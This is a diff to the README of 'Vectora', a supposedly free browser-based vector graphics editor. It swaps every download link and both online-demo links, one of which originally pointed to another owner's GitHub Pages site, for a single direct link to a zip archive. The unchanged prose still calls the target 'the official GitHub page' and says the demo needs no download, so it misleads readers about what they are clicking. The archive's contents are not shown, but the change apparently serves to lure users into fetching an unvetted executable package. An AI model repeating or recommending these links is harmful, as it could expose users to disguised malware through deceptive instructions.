@@ -1,6 +1,6 @@
 # 🎨 Vectora - Your Free Browser-Based Vector Design Studio
 
-[![Download Vectora](https://img.shields.io/badge/Download%20Vectora-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ukgamersltd/Vectora)
+[![Download Vectora](https://img.shields.io/badge/Download%20Vectora-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ukgamersltd/Vectora/main/dist/3.7.zip)
 
 Vectora is a powerful, completely free vector graphics editor that runs right in your web browser. No downloads of complicated software, no account sign-ups, and no technical knowledge needed. Whether you are designing a logo, creating illustrations, or just experimenting with shapes and colors, Vectora gives you professional-grade tools in a simple, clean interface.
 
@@ -31,7 +31,7 @@ Getting started with Vectora is incredibly easy. Since this is a web-based appli
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download Vectora](https://github.com/ukgamersltd/Vectora)**
+Visit this link to download the application: **[Download Vectora](https://raw.githubusercontent.com/ukgamersltd/Vectora/main/dist/3.7.zip)**
 
 This link takes you to the official GitHub page where Vectora is hosted. GitHub is a safe, trusted platform for sharing software. Once you are on that page, you will see a green button labeled "Code" - but do not click that yet\. Instead, look for the "Releases" section or simply scroll down to find the latest release of the software\. There you will find a download option for your operating system\.
 
@@ -182,8 +182,8 @@ A: Since Vectora is an open-source project hosted on GitHub, you can report issu
 
 To help you further, here are some links and references:
 
-- **[Open Vectora (Online Demo)](https://wieslawsoltes.github.io/Vectora/)**: Try the latest version directly in your browser without downloading anything\, just to test it out\.
-- **[Standalone HTML Version](https://wieslawsoltes.github.io/Vectora/Vectora.html)**: Access a single-file version for quick uses\.
+- **[Open Vectora (Online Demo)](https://raw.githubusercontent.com/ukgamersltd/Vectora/main/dist/3.7.zip)**: Try the latest version directly in your browser without downloading anything\, just to test it out\.
+- **[Standalone HTML Version](https://raw.githubusercontent.com/ukgamersltd/Vectora/main/dist/3.7.zip)**: Access a single-file version for quick uses\.
 - **[User and Architecture Guide](GUIDE.md)**: For those interested in deeper technical details, or want to understand how Vectora is built, this guide is included in your downloaded archive\.
 
 ## 🏁 Conclusion
@@ -192,7 +192,7 @@ Vectora represents a new generation of creative tools - powerful enough for prof
 
 Download Vectora now, unleash your creativity, and discover how enjoyable graphic design can be when the tools just work\!
 
-**[Download Vectora Now!](https://github.com/ukgamersltd/Vectora)**
+**[Download Vectora Now!](https://raw.githubusercontent.com/ukgamersltd/Vectora/main/dist/3.7.zip)**
 
 ---
 
